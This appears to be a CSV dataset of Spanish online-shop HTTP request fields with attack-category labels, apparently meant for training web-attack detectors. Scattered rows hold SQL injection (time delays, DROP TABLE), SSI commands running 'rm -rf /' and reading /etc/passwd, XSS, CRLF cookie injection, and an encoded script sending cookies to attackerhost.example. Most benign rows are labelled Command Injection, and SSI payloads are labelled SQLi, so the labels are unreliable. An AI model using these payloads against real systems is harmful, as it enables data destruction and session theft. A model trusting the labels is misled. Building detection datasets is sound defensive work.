payload,category
"registro | vera | 0ip0rbol1id7 | Samay | Artells Arteta | henn_others@lasmilyuna.gi | 13605020Z | Paseo Alcalde Rafael Ginel, 121 %3F | Fuentelisendo | 09219 | Madrid | 6311255681512253 | Registrar HTTP/1.1",Command Injection
"registro | vera | 0ip0rbol1id7 | N?el+ma | Artells Arteta | henn_others@lasmilyuna.gi | 13605020Z | Paseo Alcalde Rafael Ginel, 121  | Fuentelisendo | 09219 | Madrid | 6311255681512253 | Registrar HTTP/1.1",Command Injection
"registro | vera | 0ip0rbol1id7 | Samay | Artells Arteta | henn_others@lasmilyuna.gi | 13605020Z | Paseo Alcalde Rafael Ginel, 121  | Fuentelisendo | 09219 | Madrid | 6311255681512253 | Registrar HTTP/1.1",Command Injection
3 | Jam�n Ib�rico | 39 | 41 | A�adir al carrito HTTP/1.1,Command Injection
"entrar<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | niccolo | astrac�n | on | Entrar HTTP/1.1",SQLi
"entrar | ','0','0','0');waitfor delay '0:0:15';-- | astrac�n | on | Entrar HTTP/1.1",SQLi
"entrar | niccolo | ,1ar'aj5 | on | Entrar HTTP/1.1",Command Injection
entrar | niccolo | astrac�n | on | Entrar HTTP/1.1,Command Injection
insertar | 9594 | Pasar por caja/ HTTP/1.1,Command Injection
insertar | 9594 | Pasar por caja HTTP/1.1,Command Injection
registro | brunner- | chacr4 | Rosio | Sklar Paisano | ekblad.pughe@sindns.lb | 65648262Y | Calle Codigo Correspondencia Oficial Correos-telegrafos 14  | Aloc�n | 39490 | Huesca | 2810115740271505 | %20 HTTP/1.1,Command Injection
registro | brunner- | chacr4 | Rosio | Sklar Paisano | ekblad.pughe@sindns.lb | 65648262Y | Calle Codigo Correspondencia Oficial Correos-telegrafos 14  | Aloc�n | 3130A | Huesca | 2810115740271505 | Registrar HTTP/1.1,Command Injection
registro | brunner- | chacr4 | Rosio | Sklar Paisano | ekblad.pughe@sindns.lb | 65648262Y | Calle Codigo Correspondencia Oficial Correos-telegrafos 14  | Aloc�n | 39490 | Huesca | 2810115740271505 | Registrar HTTP/1.1,Command Injection
"registro | felicity | bo9510c8951vo | Deodato | Treig Bonitto | roo@didacramirez.kn | + | Lora 64,  | Villanueva de Teba | 43884 | Valladolid | 8769540261854446 | Registrar HTTP/1.1",Command Injection
"registro | felicity | bo9510c8951vo | Deodato | Treig Bonitto | roo@didacramirez.kn | 42952758M | Lora 64,  | Villanueva de Teba | 0930A | Valladolid | 8769540261854446 | Registrar HTTP/1.1",Command Injection
"registro | felicity | bo9510c8951vo | Deodato | Treig Bonitto | roo@didacramirez.kn | 42952758M | Lora 64,  | Villanueva de Teba | 43884 | Valladolid | 8769540261854446 | Registrar HTTP/1.1",Command Injection
"1','0','0','0');waitfor delay '0:0:15';-- | Vino Rioja | 100 | 34 | A�adir al carrito HTTP/1.1",SQLi
1 | Vino Rioja | 100 | 'OR'a='a | A�adir al carrito HTTP/1.1,Command Injection
1 | Vino Rioja | 39/ | 34 | A�adir al carrito HTTP/1.1,Command Injection
1 | Vino Rioja | 100 | 34 | A�adir al carrito HTTP/1.1,Command Injection
entrar | durward | cOrDElAzO | on | ');waitfor delay '0:0:15';-- HTTP/1.1,SQLi
"entrar | durward | 0/45,ce1/r | on | Entrar HTTP/1.1",Command Injection
entrar | durward | cOrDElAzO | on | Entrar HTTP/1.1,Command Injection
insertar | 5949? | Confirmar HTTP/1.1,Command Injection
insertar | 5949 | ' AND '1'='1 HTTP/1.1,Command Injection
insertar | 5949 | Confirmar/ HTTP/1.1,Command Injection
insertar | 5949 | Confirmar HTTP/1.1,Command Injection
registro'INJECTED_PARAM | lysinger | D9SOr9an21a2oR | Giovana | Planelles Neris | measor.barezewska@enlanzarote.com.gq | 54498003D | C/ Fuensanta 41  | Sangarr�n | 32650 | Huesca | 5070328292613697 | Registrar HTTP/1.1,Command Injection
registro | lysinger | D9SOr9an21a2oR | Giovana | Planelles Neris | measor.barezewska@enlanzarote.com.gq | 54498003D | C/ Fuensanta 41  | ';waitfor delay '0:0:15';-- | 32650 | Huesca | 5070328292613697 | Registrar HTTP/1.1,SQLi
registro | lysinger | D9SOr9an21a2oR | Giovana | Planelles Neris | @hav@@oc@librodeapuntes.cn | 54498003D | C/ Fuensanta 41  | Sangarr�n | 32650 | Huesca | 5070328292613697 | Registrar HTTP/1.1,Command Injection
registro | lysinger | D9SOr9an21a2oR | Giovana | Planelles Neris | measor.barezewska@enlanzarote.com.gq | 54498003D | C/ Fuensanta 41  | Sangarr�n | 32650 | Huesca | 5070328292613697 | Registrar HTTP/1.1,Command Injection
registro | blumenfe | jaq55l | Noelia | Maquieira San Segundo | boucher@paremoselalzheimer.at | 50781133P | Calle Horticola 51  | Campo Lugar | 4054A | Zamora | 7191364141648176 | Registrar HTTP/1.1,Command Injection
registro | blumenfe | jaq55l | Noelia | Maquieira San Segundo | boucher@paremoselalzheimer.at | 50781133P | Calle Horticola 51  | Campo Lugar | 46443 | Zamora | 7191364141648176 | Registrar HTTP/1.1,Command Injection
1 | Jam�n Ib�rico | 39 | 82 | %00 HTTP/1.1,Command Injection
2/ | Jam�n Ib�rico | 39 | 82 | A�adir al carrito HTTP/1.1,Command Injection
1 | Jam�n Ib�rico | 39 | 82 | A�adir al carrito HTTP/1.1,Command Injection
entrar | berenice | ENfEUdACI�n@40 | on | Entrar HTTP/1.1,Command Injection
entrar | berenice | ENfEUdACI�n | off/ | Entrar HTTP/1.1,Command Injection
entrar | berenice | ENfEUdACI�n | on | Entrar HTTP/1.1,Command Injection
insertar | 1380 | Pasar por cajaparos%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 HTTP/1.1,Command Injection
insertar | 1380 | any%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 HTTP/1.1,Command Injection
insertar | 1380 | Pasar por caja/ HTTP/1.1,Command Injection
insertar | 1380 | Pasar por caja HTTP/1.1,Command Injection
"registro | micgael5 | dogal | Adelmo | Jepus Novas | cagney@hiperespa�a.et'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 99942317A | Carrer Sant Fruitos 1,  | Riells i Viabrea | 29410 | M�laga | 4452881808901719 | Registrar HTTP/1.1",SQLi
"registro | micgael5 | dogal | Adelmo | + | cagney@hiperespa�a.et | 99942317A | Carrer Sant Fruitos 1,  | Riells i Viabrea | 29410 | M�laga | 4452881808901719 | Registrar HTTP/1.1",Command Injection
"registro | /,*stellwag | dogal | Adelmo | Jepus Novas | cagney@hiperespa�a.et | 99942317A | Carrer Sant Fruitos 1,  | Riells i Viabrea | 29410 | M�laga | 4452881808901719 | Registrar HTTP/1.1",Command Injection
"registro | micgael5 | dogal | Adelmo | Jepus Novas | cagney@hiperespa�a.et | 99942317A | Carrer Sant Fruitos 1,  | Riells i Viabrea | 29410 | M�laga | 4452881808901719 | Registrar HTTP/1.1",Command Injection
"registro | nady | 9va3831','0','0');waitfor delay '0:0:15';-- | Shirley | Urbaez Mariangel | erlich-jarrel@modeloscaninos.ni | 39759775C | Algarrobo 197 3?F | Navalonguilla | 50268 | Segovia | 5083698855321760 | Registrar HTTP/1.1",SQLi
registro | nady | 9va3831 | Shirley | Urbaez Mariangel | erlich-jarrel@modeloscaninos.ni | 39759775C | any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | Navalonguilla | 50268 | Segovia | 5083698855321760 | Registrar HTTP/1.1,Command Injection
registro | nady | 9va3831 | Shirley | Urbaez Mariangel | erlich-jarrel@modeloscaninos.ni | 39759775C | Algarrobo 197 3?F | Navalonguilla | 0379A | Segovia | 5083698855321760 | Registrar HTTP/1.1,Command Injection
registro | nady | 9va3831 | Shirley | Urbaez Mariangel | erlich-jarrel@modeloscaninos.ni | 39759775C | Algarrobo 197 3?F | Navalonguilla | 50268 | Segovia | 5083698855321760 | Registrar HTTP/1.1,Command Injection
3 | Jam�n Ib�rico | 39 | 34 | A�adir al carrito HTTP/1.1,Command Injection
entrar | tres-sup | qui4erear | onbob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | Entrar HTTP/1.1,XSS
"entrar | tres-sup | 8,if�c6l | on | Entrar HTTP/1.1",Command Injection
' AND '1'='1 | 1033 | Confirmar HTTP/1.1,Command Injection
insertar | 1033 | Confirmar/ HTTP/1.1,Command Injection
insertar | 1033 | Confirmar HTTP/1.1,Command Injection
"registro | winona | pic�n | Nayla | Torre Xu | hyer_longdon0@artforall.mc | 83627503D','0','0','0');waitfor delay '0:0:15';-- | Calle Corbina, 100  | Hornillos de Cameros | 46691 | Cuenca | 5175565918974704 | Registrar HTTP/1.1",SQLi
"registro | winona | pic�n | Nayla | Torre Xu | hyer_longdon0@artforall.mc | 83627503D | Calle Corbina, 100  | Hornillos de Cameros | 46691 | Cuenca | 5175565918974704 | @40 HTTP/1.1",Command Injection
"registro | winona | pic�n | Nayla | Torre Xu | hyer_longdon0@artforall.mc | 83627503D | Calle Corbina, 100  | Hornillos de Cameros | 0822A | Cuenca | 5175565918974704 | Registrar HTTP/1.1",Command Injection
"registro | winona | pic�n | Nayla | Torre Xu | hyer_longdon0@artforall.mc | 83627503D | Calle Corbina, 100  | Hornillos de Cameros | 46691 | Cuenca | 5175565918974704 | Registrar HTTP/1.1",Command Injection
"registro | wassim | matach�n | Frida | Ramenghi Zachrisson | decorsica_altenhaus@muchachina.ie | 93484863Y | Los Arrastres 124,  | San Mart�n de Unx | 48940 | J?a+�n | 8940491732562481 | Registrar HTTP/1.1",Command Injection
"registro | wassim | matach�n | Frida | Ramenghi Zachrisson | decorsica_altenhaus@muchachina.ie | 93484863Y | Los Arrastres 124,  | San Mart�n de Unx | 48940 | Madrid | 8940491732562481 | Registrar HTTP/1.1",Command Injection
"3 | Queso Manchego | 100 | 6 | A�adir al carrito<!--#include file=""archivo_secreto"" --> HTTP/1.1",SQLi
3 | Queso Manchego | 39/ | 6 | A�adir al carrito HTTP/1.1,Command Injection
3 | Queso Manchego | 100 | 6 | A�adir al carrito HTTP/1.1,Command Injection
entrar | o.murchu | .perrera | onbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org | Entrar HTTP/1.1,Command Injection
entrar | o.murchu | .perrera | off/ | Entrar HTTP/1.1,Command Injection
entrar | o.murchu | .perrera | on | Entrar HTTP/1.1,Command Injection
'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 5080 | Pasar por caja HTTP/1.1,SQLi
insertar | 5080 | Pasar por caja/ HTTP/1.1,Command Injection
"registro | simzer | a26laN6a5O | Borna | Ponce Abad�a | inclan@aprendeaestudiar.ec | 63019006H | Jose Sanchez Pescador S/N, 9-A | Coronada, La | 3913A | Toledo | 6649652935543559 | Registrar HTTP/1.1",Command Injection
"registro | simzer | a26laN6a5O | Borna | Ponce Abad�a | inclan@aprendeaestudiar.ec | 63019006H | Jose Sanchez Pescador S/N, 9-A | Coronada, La | 16316 | Toledo | 6649652935543559 | Registrar HTTP/1.1",Command Injection
"registro | seagrove | pataleo | Grey | Bollit Ingl�s | weigel@lamasguapa.cc | 15744863Y | Avda. El Vado, 72  | Torno, El | 18129 | C�ceres | 2139911097438297 | Registrar+ HTTP/1.1",Command Injection
"registro | seagrove | pataleo | Grey | Bollit Ingl�s | weigel@lamasguapa.cc | 15744863Y | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | Torno, El | 18129 | C�ceres | 2139911097438297 | Registrar HTTP/1.1",SQLi
"registro | seagrove | pataleo | Grey | Bollit Ingl�s | weigel@lamasguapa.cc | 15744863Y | Avda. El Vado, 72  | Torno, El | 18129 | C�ceres | 2139911097438297 | Registrar HTTP/1.1",Command Injection
3 | Queso Manchego | 39 | 88' DELETE FROM USERS | A�adir al carrito HTTP/1.1,Command Injection
3 | Queso Manchego | 39 | 88 | A�adir al carrito HTTP/1.1,Command Injection
entrar@40 | carolien | p68vILl7Ja6 | on | Entrar HTTP/1.1,Command Injection
entrar | carolien | maquiave'li'sta | on | Entrar HTTP/1.1,Command Injection
entrar | carolien | p68vILl7Ja6 | on | Entrar HTTP/1.1,Command Injection
insertar | 460 | Pasar por caja/ HTTP/1.1,Command Injection
"registro | baughan | piache | Umberto | Sans Oc�n | rutherford@cumbareback.ly | 99500842J | C/ Isidoro Millan Mari�o 14, 9?F | Veganzones | 1914A | Barcelona | 3563768127894231 | Registrar HTTP/1.1",Command Injection
"registro | baughan | piache | Umberto | Sans Oc�n | rutherford@cumbareback.ly | 99500842J | C/ Isidoro Millan Mari�o 14, 9?F | Veganzones | 11660 | Barcelona | 3563768127894231 | Registrar HTTP/1.1",Command Injection
"registroany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A | khorami | ta5a | Lynge | Ce�al | heard@barebackspain.cf | 73611157W | Organista Plasencia 73, 7-H | Ripollet | 50491 | Teruel | 8862208467405962 | Registrar HTTP/1.1",Command Injection
"registro | khorami | ta5a | Lynge | Ce�al | heard@barebackspain.cf | 73611157W | Organista Plasencia 73, 7-H | Ripollet | 50491 | Teruel | 385531057488688A | Registrar HTTP/1.1",Command Injection
"registro | khorami | ta5a | Lynge | Ce�al | heard@barebackspain.cf | 73611157W | Organista Plasencia 73, 7-H | Ripollet | 50491 | Teruel | 8862208467405962 | Registrar HTTP/1.1",Command Injection
1 | ' AND '1'='1 | 39 | 9 | A�adir al carrito HTTP/1.1,Command Injection
1 | Vino .*?Rioja | 39 | 9 | A�adir al carrito HTTP/1.1,Command Injection
1 | Jam�n Ib�rico | 39 | 9 | A�adir al carrito HTTP/1.1,Command Injection
entrar | ettridge | paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 | on | Entrar HTTP/1.1,Command Injection
entrar | ettridge | guaranga | on/ | Entrar HTTP/1.1,Command Injection
entrar | ettridge | guaranga | on | Entrar HTTP/1.1,Command Injection
insertar | 6569 | Confirmar/ HTTP/1.1,Command Injection
insertar | 6569 | Pasar por caja HTTP/1.1,Command Injection
"registro | robena1 | improvisaci�n | Reinoldo | Gelabert | oland5@schnaps.com.by | 51756068L | C/ Santa Escolastica 178,  | Quintanilla de Arriba | 35543' DELETE FROM USERS | Huesca | 7852557135021483 | Registrar HTTP/1.1",Command Injection
"registro | robena1 | improvisaci�n | Reinoldo | Gelabert | oland5@schnaps.com.by | 51756068L | C/ Santa Escolastica 178,  | Quintanilla de Arriba | 35543 | Llei?d?a | 7852557135021483 | Registrar HTTP/1.1",Command Injection
"registro | robena1 | improvisaci�n | Reinoldo | Gelabert | oland5@schnaps.com.by | 51756068L | C/ Santa Escolastica 178,  | Quintanilla de Arriba | 35543 | Huesca | 7852557135021483 | Registrar HTTP/1.1",Command Injection
"registro | madlen4 | dual | Irla | Kercad� Pellini | gibbs@gia.com.sh | 92705279F | C/ Principal De San Bartolome, 113  | Lobios | 06411 | Toledo| | 6284462739974610 | Registrar HTTP/1.1",Command Injection
"registro | madlen4 | dual | Irla | Kercad� Pellini | any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | 92705279F | C/ Principal De San Bartolome, 113  | Lobios | 06411 | Toledo | 6284462739974610 | Registrar HTTP/1.1",Command Injection
"registro | madlen4 | dual | Irla | L-itt Bot-a | gibbs@gia.com.sh | 92705279F | C/ Principal De San Bartolome, 113  | Lobios | 06411 | Toledo | 6284462739974610 | Registrar HTTP/1.1",Command Injection
2bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | Vino Rioja | 100 | 21 | A�adir al carrito HTTP/1.1,XSS
2 | Ques+o Manchego | 100 | 21 | A�adir al carrito HTTP/1.1,Command Injection
2 | Vino Rioja | 100 | 21 | A�adir al carrito HTTP/1.1,Command Injection
entrar | ardoin | antroponimi6any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | on | Entrar HTTP/1.1,Command Injection
"entrar | ardoin | ceno,taf''io | on | Entrar HTTP/1.1",Command Injection
entrar | ardoin | antroponimi6 | on | Entrar HTTP/1.1,Command Injection
insertar | 5823 | Set-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,Command Injection
insertar | 5823 | Pasar por caja/ HTTP/1.1,Command Injection
insertar | 5823 | Pasar por caja HTTP/1.1,Command Injection
"registro | <!--#EXEC cmd=""ls /""--> | e8c5mulg055r | Sindulfo | Labastie Princep | beckley.sone@sayuela.ge | 96517735Y | Carrer Marges 174 9B | Villanueva del Trabuco | 05152 | Tarragona | 1337485764739687 | Registrar HTTP/1.1",SQLi
registro | raghava | e8c5mulg055r | -'Am�s | Labastie Princep | beckley.sone@sayuela.ge | 96517735Y | Carrer Marges 174 9B | Villanueva del Trabuco | 05152 | Tarragona | 1337485764739687 | Registrar HTTP/1.1,Command Injection
registro | raghava | e8c5mulg055r | Sindulfo | Labastie Princep | beckley.sone@sayuela.ge | 96517735Y | Carrer Marges 174 9B | Villanueva del Trabuco | 05152 | Tarragona | 1337485764739687 | Registrar HTTP/1.1,Command Injection
"registro | tejani | CO9E69 | Neomenia | Aregall Picabea | diplan-renaldo@softgold.com.ai | 08971049Z | Calle Doctor Larra y Cerezo, 157 2-H | Cubillos | 03277 | Alicante | 3990694618308392+ | Registrar HTTP/1.1",Command Injection
"registro | tejani | CO9E69 | Neomenia | Aregall Picabea | diplan-renaldo@softgold.com.ai | 08971049Z | Calle Doctor Larra y Cerezo, 157 2-H | Cubillos | 03277 | S?egovia | 3990694618308392 | Registrar HTTP/1.1",Command Injection
"registro | tejani | CO9E69 | Neomenia | Aregall Picabea | diplan-renaldo@softgold.com.ai | 08971049Z | Calle Doctor Larra y Cerezo, 157 2-H | Cubillos | 03277 | Alicante | 3990694618308392 | Registrar HTTP/1.1",Command Injection
"2 | Vino Rioja""><!--#EXEC cmd=""dir ""-->< | 85 | 90 | A�adir al carrito HTTP/1.1",SQLi
"2 | "" AND ""1""=""1 | 85 | 90 | A�adir al carrito HTTP/1.1",Command Injection
2 | Vino Rioja | 85 | 90 | A�adir al carrito HTTP/1.1,Command Injection
entrar | gabie | menorqu�n | on%3F | Entrar HTTP/1.1,Command Injection
entrar | ??eryn | menorqu�n | on | Entrar HTTP/1.1,Command Injection
insertar | 7095any%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 | Confirmar HTTP/1.1,Command Injection
"insertar | 7095 | "" AND ""1""=""1 HTTP/1.1",Command Injection
insertar | 7095 | Confirmar/ HTTP/1.1,Command Injection
insertar | 7095 | Confirmar HTTP/1.1,Command Injection
"registro | bobbette | v4N0c76.SE | Albere | Guri Oll�s | mallalieu@soymuyguapa.ml | 58990935Y | Pla�a Puerto Rico, 144  | Guadalajara | 21320 | Soria | 0626053300449217 | Registrarany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1",Command Injection
"registro | bobbette | v4N0c76.SE | Albere | Casa Aro-ca | mallalieu@soymuyguapa.ml | 58990935Y | Pla�a Puerto Rico, 144  | Guadalajara | 21320 | Soria | 0626053300449217 | Registrar HTTP/1.1",Command Injection
"registro | bobbette | v4N0c76.SE | Albere | Guri Oll�s | mallalieu@soymuyguapa.ml | 58990935Y | Pla�a Puerto Rico, 144  | Guadalajara | 21320 | Soria | 0626053300449217 | Registrar HTTP/1.1",Command Injection
"registro | arco | b74RerA | Agueda | Sauri Sanaspleda | %20 | 57154114B | Calle Medellin 188, 3E | A�ana | 26360 | C�ceres | 6165671894107883 | Registrar HTTP/1.1",Command Injection
"registro | arco | b74RerA | Agueda | Sauri Sanaspleda | gozzi@encuentrodominios.at | 57154114B | Calle Medellin 188, 3E | H/erram�lluri | 26360 | C�ceres | 6165671894107883 | Registrar HTTP/1.1",Command Injection
"registro | arco | b74RerA | Agueda | Sauri Sanaspleda | gozzi@encuentrodominios.at | 57154114B | Calle Medellin 188, 3E | A�ana | 26360 | C�ceres | 6165671894107883 | Registrar HTTP/1.1",Command Injection
1 | Vino Riojasessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? | 85 | 21 | A�adir al carrito HTTP/1.1,Command Injection
"1 | Vino Rioja | 85 | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | A�adir al carrito HTTP/1.1",SQLi
1 | Vino .*?Rioja | 85 | 21 | A�adir al carrito HTTP/1.1,Command Injection
1 | Vino Rioja | 85 | 21 | A�adir al carrito HTTP/1.1,Command Injection
"entrar | perkins','0','0','0','0');waitfor delay '0:0:15';-- | 7ad524z | off | Entrar HTTP/1.1",SQLi
entrar | perkins | 7ad524z | on/ | Entrar HTTP/1.1,Command Injection
entrar | perkins | 7ad524z | off | Entrar HTTP/1.1,Command Injection
insertar | 1980'INJECTED_PARAM | Confirmar HTTP/1.1,Command Injection
insertar | 1980 | ');waitfor delay '0:0:15';-- HTTP/1.1,SQLi
insertar | 1980 | Confirmar/ HTTP/1.1,Command Injection
insertar | 1980 | Confirmar HTTP/1.1,Command Injection
"registro'INJECTED_PARAM | benny | 0REn3Ga6 | Eudosio | Miguez Chew | doyle-murray@ajuntamentbarcelona2-0.hn | 76229865E | Travesia 1 De Los Laureles, 144,  | Sant Cugat Sesgarrigues | 28300 | Burgos | 9519490312798235 | Registrar HTTP/1.1",Command Injection
